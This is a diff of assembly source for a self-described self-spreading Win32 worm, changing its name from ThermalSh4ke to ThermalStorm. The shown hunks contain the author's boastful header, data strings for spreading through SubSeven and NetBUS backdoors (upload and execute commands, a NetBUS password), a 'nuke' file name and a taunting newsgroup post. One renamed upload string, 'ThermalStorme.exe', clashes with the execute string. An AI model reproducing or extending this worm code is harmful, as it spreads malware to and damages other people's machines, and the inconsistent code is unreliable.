@@ -1,7 +1,7 @@
-;; Win32.ThermalSh4ke
+;; Win32.ThermalStorm
 ;;
 ;; Comment:
-;;    Heyyyyy guyyzz! Time to introduce Win32.ThermalSh4ke:
+;;    Heyyyyy guyyzz! Time to introduce Win32.ThermalStorm:
 ;;    A self-*spreading* parAsitic feather-weight internet-worm. It
 ;;    is one of my first ever polymorphic generic malware for the Win32.
 ;;    As it is a perfect opporunity to show my BlaCk-H@ skillzz. xD.
@@ -9,7 +9,7 @@
 ;;    The worm body is still unfinished, so don't expect much!
 ;;
 ;; General sheet of characteristics:
-;;    Name of the virus.............: Win32.ThermalSh4ke
+;;    Name of the virus.............: Win32.ThermalStorm
 ;;    Author........................: Timo 'HaZeL' Sarkar / March 2021
 ;;    Size..........................: On 1st generation: approx. 60 bytes
 ;;    Compiled size.................: On 1st generation: approx.
@@ -118,22 +118,22 @@ FIONBIO                     EQU     8004667Eh
 WM_QUIT                     EQU     0012h
 
 ;; Define the binary name for uploading to SubSeven
-UPLOAD_REQUEST              DB      "RTFThermalShake.exe"
+UPLOAD_REQUEST              DB      "RTFThermalStorm.exe"
 END_UPLOAD_REQUEST
 ;; Define the primary worm-body size for the upload
 UPLOAD_SIZE                 DB      "SFT0460"
 END_UPLOAD_SIZE
 ;; Define the SubSEven execution request binary-name
-EXEC_REQUEST                DB      "FMXThermalShake.exe"
+EXEC_REQUEST                DB      "FMXThermalStorm.exe"
 END_EXEC_REQUEST
 ;; Define the Password for interfacing with the NetBUS service
 NETBUS_PASSWORD             DB      "Password;1;netbus", 0Dh
 END_NETBUS_PASSWORD
 ;; Define function for dealing with the NetBUS upload request
-NETBUS_UPLOAD_REQUEST       DB      "UploadFile;ThermalShake.exe;60;\", 0Dh
+NETBUS_UPLOAD_REQUEST       DB      "UploadFile;ThermalStorme.exe;60;\", 0Dh
 END_NETBUS_UPLOAD_REQUEST
 ;; Define function for executing the received binary-file
-NETBUS_EXEC_FILE            DB      "StartApp;\ThermalShake.exe", 0Dh
+NETBUS_EXEC_FILE            DB      "StartApp;\ThermalStorm.exe", 0Dh
 END_NETBUS_EXEC_FILE
 ;; Definitions of other miscellaneous functions and variables
 DEFINITIVE_NUKE_FILE        DB      "BBQ666.COM", 0
@@ -160,12 +160,12 @@ S_QUIT                      DB      "QUIT", 0Dh, 0Ah
 ;; Definition of ThermalShake Generation 2 in Outlook. Here
 ;; resides his malware-header... 
 NEWS_MESSAGE                DB      "From: 'HaZzeL' <heaven@rainbow.pony>", 0Dh, 0Ah
-                            DB      "Subject: ThermalShake was here... xD", 0Dh, 0Ah
+                            DB      "Subject: ThermalStorm was here... xD", 0Dh, 0Ah
                             DB      "Newsgroups: heaven.ponyfoo", 0Dh, 0Ah
                             DB      0Dh, 0Ah
                             DB      "HeYy y0u stuPid uSer...", 0Dh, 0Ah
                             DB      "y0uR S3cuRitY is hella bAd xD. Pleas3 st0p hAvIng Fun & stArt fiXing your SoftW4re!", 0Dh, 0Ah
-                            DB      "ThermalShake was here... Next T1me Stop play!ng aroUnd wiTh aggressive M4lware", 0Dh, 0Ah
+                            DB      "ThermalStorm was here... Next T1me Stop play!ng aroUnd wiTh aggressive M4lware", 0Dh, 0Ah
                             DB      "Greetzz: HaZzel xD", 0Dh, 0Ah
                             DB      ".", 0Dh, 0Ah
 END_NEWS_MESSAGE:
